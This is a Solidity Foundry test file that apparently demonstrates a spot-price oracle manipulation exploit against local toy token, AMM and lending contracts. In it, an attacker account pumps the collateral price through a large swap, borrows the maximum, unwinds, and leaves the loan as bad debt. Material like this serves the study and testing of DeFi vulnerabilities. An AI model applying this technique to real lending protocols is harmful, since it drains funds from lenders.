// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C04.sol";
contract C04Test is Test {
    TokenC04 usds; TokenC04 gcol; AmmC04 amm; LendingC04 lending;
    address lender = makeAddr("lender"); address attacker = makeAddr("attacker");
    function setUp() public {
        usds = new TokenC04("USD Stable", "USDS"); gcol = new TokenC04("Gov Collateral", "GCOL");
        amm = new AmmC04(usds, gcol);
        usds.mint(address(this), 1_000e18); gcol.mint(address(this), 1_000e18);
        usds.approve(address(amm), type(uint256).max); gcol.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1_000e18, 1_000e18);
        lending = new LendingC04(usds, gcol, amm);
        usds.mint(lender, 10_000e18);
        vm.startPrank(lender); usds.approve(address(lending), type(uint256).max); lending.supply(10_000e18); vm.stopPrank();
        gcol.mint(attacker, 100e18); usds.mint(attacker, 5_000e18);
    }
    function test_exploit_spotOracleManipulationBadDebt() public {
        vm.startPrank(attacker);
        gcol.approve(address(lending), type(uint256).max);
        usds.approve(address(amm), type(uint256).max); gcol.approve(address(amm), type(uint256).max);
        lending.depositCollateral(100e18);
        amm.swap(address(usds), 5_000e18, 0);          // pump GCOL spot price
        uint256 maxB = lending.maxBorrow(attacker);
        lending.borrow(maxB);
        vm.stopPrank();
        vm.startPrank(attacker); amm.swap(address(gcol), gcol.balanceOf(attacker), 0); vm.stopPrank(); // unwind
        assertGt(maxB, 200e18, "borrowed >> fair ~100");
        assertLt(lending.collateralValue(attacker), lending.debtOf(attacker), "position insolvent");
        assertGt(usds.balanceOf(attacker), 0);
    }
}
